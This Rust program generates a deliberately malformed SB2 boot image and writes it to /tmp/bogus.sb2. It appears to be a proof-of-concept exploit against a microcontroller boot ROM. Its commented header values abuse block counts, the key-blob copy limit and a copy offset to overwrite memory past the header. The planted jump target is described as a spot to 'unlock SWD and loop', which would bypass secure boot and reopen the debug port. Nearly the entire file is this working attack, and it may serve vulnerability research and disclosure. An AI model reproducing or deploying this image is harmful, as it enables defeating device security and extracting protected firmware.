use std::io::Write;

// Total number of blocks in our "image"
// Probably overkill
const NUM_BLOCKS: usize = 256;

fn main() {
    let mut image: [u32; 4 * NUM_BLOCKS] = [0; 4 * NUM_BLOCKS];

    // Start of our header
    //
    //     struct sb2_header_t
    //{
    //    uint32_t nonce[4];            //!< Nonce for AES-CTR
    //
    //    uint32_t reserved;            //!< Reserved, un-used
    //    uint8_t m_signature[4];       //!< 'STMP', see #ROM_IMAGE_HEADER_SIGNATURE.
    //    uint8_t m_majorVersion;       //!< Major version for the image format, see #ROM_BOOT_IMAGE_MAJOR_VERSION.
    //    uint8_t m_minorVersion;       //!< Minor version of the boot image format, see #ROM_BOOT_IMAGE_MINOR_VERSION.
    //
    //    uint16_t m_flags;             //!< Flags or options associated with the entire image.
    //    uint32_t m_imageBlocks;       //!< Size of entire image in blocks.
    //    uint32_t m_firstBootTagBlock; //!< Offset from start of file to the first boot tag, in blocks.
    //    section_id_t m_firstBootableSectionID; //!< ID of section to start booting from.
    //
    //    uint32_t m_offsetToCertificateBlockInBytes;     //! Offset in bytes to the certificate block header for a signed SB file.
    //
    //    uint16_t m_headerBlocks;               //!< Size of this header, including this size word, in blocks.

    //    uint16_t m_keyBlobBlock;      //!< Block number where the key blob starts
    //    uint16_t m_keyBlobBlockCount; //!< Number of cipher blocks occupied by the key blob.
    //    uint16_t m_maxSectionMacCount; //!< Maximum number of HMAC table entries used in all sections of the SB file.
    //    uint8_t m_signature2[4];      //!< Always set to 'sgtl'

    //    uint64_t m_timestamp;         //!< Timestamp when image was generated in microseconds since 1-1-2000.
    //    version_t m_productVersion;   //!< User controlled product version.
    //    version_t m_componentVersion; //!< User controlled component version.
    //    uint32_t m_buildNumber;          //!< User controlled build number.
    //    uint8_t m_padding1[4];        //!< Padding to round up to next cipher block.
    //};
    //TODO make this a packed struct

    // This is the nonce which we don't care about
    //
    // This is some kind of checksum in the header, add it for good measure
    image[0] = 0x00000e8f;
    // Our target address to juimp
    // Nice spot to unlock SWD and loop!
    image[1] = 0x1301ae71;

    // Several branch to self. Was using for testing, doesn't hurt to keep
    image[2] = 0xe7fee7fe;
    // Extra from testing
    image[3] = 0x44444444;

    // Reserved field
    image[4] = 0x0;
    // magic in the header
    image[5] = 0x504d5453;
    // major, minor, flags
    image[6] = 0x00080102;
    // Image blocks: we need the total here to include the space we want to ovewrite
    image[7] = 0x41;

    // first boot block this needs to be > than the
    // key blob block
    image[8] = 0x40;
    // section Id to start booting (not needed)
    image[9] = 0x0;
    // cert offset (not needed)
    image[10] = 0x40;
    // key blob blocks (what we use to specifiy our limit for copying) + header blocks
    image[11] = 0x000230006;

    // keyblob block count + mac section MAC (don't care)
    image[12] = 0x00050001;
    // more magic
    image[13] = 0x6c746773;
    // time stamp 1
    image[14] = 0x12345678;
    // time stamp 2
    // Needs to be zero to avoid overwriting some field after copy
    image[15] = 0x0;

    // versions (don't care)
    image[16] = 0x0000ffff;
    image[17] = 0x00001111;
    image[18] = 0x12345678;
    image[19] = 0x00000000;
    image[20] = 0x12345678;
    image[21] = 0x12345789;
    image[22] = 0x00000006;
    image[23] = 0x23563453;
    // This is the end of our official header

    // All the rest of the bytes afterwards are not technically necessary except
    // where noted
    image[24] = 0x11111111;
    image[28] = 0x22222222;
    image[32] = 0x33333333;

    // this goes into some kind of byte offset for copying and gets
    // checked. Might keep 0 for now or could try making it neg?
    //image[36] = 0x44444444;
    //image[36] = 0xffffffff;
    image[40] = 0x55555555;
    image[44] = 0x66666666;
    image[48] = 0x77777777;
    image[52] = 0x88888888;
    image[56] = 0x99999999;
    image[60] = 0xaaaaaaaa;
    image[64] = 0xbbbbbbbb;
    image[68] = 0xcccccccc;
    image[72] = 0xdddddddd;
    image[76] = 0xeeeeeeee;
    image[80] = 0xffffffff;
    image[84] = 0x11111111;
    image[88] = 0x22222222;
    image[92] = 0x33333333;
    image[96] = 0x44444444;

    image[100] = 0x55555555;
    image[104] = 0x66666666;
    image[108] = 0x77777777;
    image[112] = 0x88888888;
    image[116] = 0x99999999;
    image[120] = 0xaaaaaaaa;
    image[124] = 0xbbbbbbbb;
    image[128] = 0xcccccccc;
    image[132] = 0xdddddddd;
    image[136] = 0x00000000;
    // heap address
    image[138] = 0x14001478;
    // Heap size
    image[139] = 0x4000;
    image[140] = 0xffffffff;

    let mut out = std::fs::OpenOptions::new()
        .write(true)
        .truncate(true)
        .append(false)
        .create(true)
        .open("/tmp/bogus.sb2")
        .unwrap();

    let hacked_image =
        unsafe { core::mem::transmute::<[u32; 4 * NUM_BLOCKS], [u8; 4 * NUM_BLOCKS * 4]>(image) };

    out.write_all(&hacked_image);
}
